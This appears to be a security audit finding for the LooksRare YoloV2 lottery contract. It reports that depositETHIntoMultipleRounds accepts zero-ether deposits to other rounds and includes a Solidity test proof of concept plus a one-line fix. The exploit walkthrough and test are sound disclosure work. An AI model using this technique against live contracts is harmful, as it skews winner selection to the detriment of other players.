Mythical Satin Tuna

high

# Users can deposit "0" ether to any round

## Summary
The main invariant to determine the winner is that the indexes must be in ascending order with no repetitions. Therefore, depositing "0" is strictly prohibited as it does not increase the index. However, there is a method by which a user can easily deposit "0" ether to any round without any extra costs than gas.
## Vulnerability Detail
As stated in the summary, depositing "0" will not increment the entryIndex, leading to a potential issue with the indexes array. This, in turn, may result in an unfair winner selection due to how the upper bound is determined in the array. The relevant code snippet illustrating this behavior is found [here](https://github.com/sherlock-audit/2024-01-looksrare/blob/7d76b96a58a6aee38f23bb38b8a5daa3bdc03f7c/contracts-yolo/contracts/libraries/Arrays.sol#L17-L19).

Let's check the following code snippet in the `depositETHIntoMultipleRounds` function
```solidity
for (uint256 i; i < numberOfRounds; ++i) {
            uint256 roundId = _unsafeAdd(startingRoundId, i);
            Round storage round = rounds[roundId];
            uint256 roundValuePerEntry = round.valuePerEntry;
            if (roundValuePerEntry == 0) {
                (, , roundValuePerEntry) = _writeDataToRound({roundId: roundId, roundValue: 0});
            }

            _incrementUserDepositCount(roundId, round);

            // @review depositAmount can be "0"
            uint256 depositAmount = amounts[i];

            // @review 0 % ANY_NUMBER = 0
            if (depositAmount % roundValuePerEntry != 0) {
                revert InvalidValue();
            }
            uint256 entriesCount = _depositETH(round, roundId, roundValuePerEntry, depositAmount);
            expectedValue += depositAmount;

            entriesCounts[i] = entriesCount;
        }

        // @review will not fail as long as user deposits normally to 1 round
        // then he can deposit to any round with "0" amounts
        if (expectedValue != msg.value) {
            revert InvalidValue();
        }
```

as we can see in the above comments added by me starting with "review" it explains how its possible. As long as user deposits normally to 1 round then he can also deposit "0" amounts to any round because the `expectedValue` will be equal to msg.value.

**Textual PoC:**
Assume Alice sends the tx with 1 ether as msg.value and "amounts" array as [1 ether, 0, 0].
first time the loop starts the 1 ether will be correctly evaluated in to the round. When the loop starts the 2nd and 3rd iterations it won't revert because the following code snippet will be "0" and adding 0 to `expectedValue` will not increment to `expectedValue` so the msg.value will be exactly same with the `expectedValue`.
```solidity
if (depositAmount % roundValuePerEntry != 0) {
                revert InvalidValue();
            }
```

**Coded PoC (copy the test to `Yolo.deposit.sol` file and run the test):**
```solidity
function test_deposit0ToRounds() external {
        vm.deal(user2, 1 ether);
        vm.deal(user3, 1 ether);

        // @dev first round starts normally
        vm.prank(user2);
        yolo.deposit{value: 1 ether}(1, _emptyDepositsCalldata());

        // @dev user3 will deposit 1 ether to the current round(1) and will deposit
        // 0,0 to round 2 and round3
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 1 ether;
        amounts[1] = 0;
        amounts[2] = 0;
        vm.prank(user3);
        yolo.depositETHIntoMultipleRounds{value: 1 ether}(amounts);

        // @dev check user3 indeed managed to deposit 0 ether to round2
        IYoloV2.Deposit[] memory deposits = _getDeposits(2);
        assertEq(deposits.length, 1);
        IYoloV2.Deposit memory deposit = deposits[0];
        assertEq(uint8(deposit.tokenType), uint8(IYoloV2.YoloV2__TokenType.ETH));
        assertEq(deposit.tokenAddress, address(0));
        assertEq(deposit.tokenId, 0);
        assertEq(deposit.tokenAmount, 0);
        assertEq(deposit.depositor, user3);
        assertFalse(deposit.withdrawn);
        assertEq(deposit.currentEntryIndex, 0);

        // @dev check user3 indeed managed to deposit 0 ether to round3
        deposits = _getDeposits(3);
        assertEq(deposits.length, 1);
        deposit = deposits[0];
        assertEq(uint8(deposit.tokenType), uint8(IYoloV2.YoloV2__TokenType.ETH));
        assertEq(deposit.tokenAddress, address(0));
        assertEq(deposit.tokenId, 0);
        assertEq(deposit.tokenAmount, 0);
        assertEq(deposit.depositor, user3);
        assertFalse(deposit.withdrawn);
        assertEq(deposit.currentEntryIndex, 0);
    }
```
## Impact
High, since it will alter the games winner selection and it is very cheap to perform the attack.
## Code Snippet
https://github.com/sherlock-audit/2024-01-looksrare/blob/7d76b96a58a6aee38f23bb38b8a5daa3bdc03f7c/contracts-yolo/contracts/YoloV2.sol#L312-L362
## Tool used

Manual Review

## Recommendation
Add the following check inside the depositETHIntoMultipleRounds function
```solidity
if (depositAmount == 0) {
     revert InvalidValue();
   }
```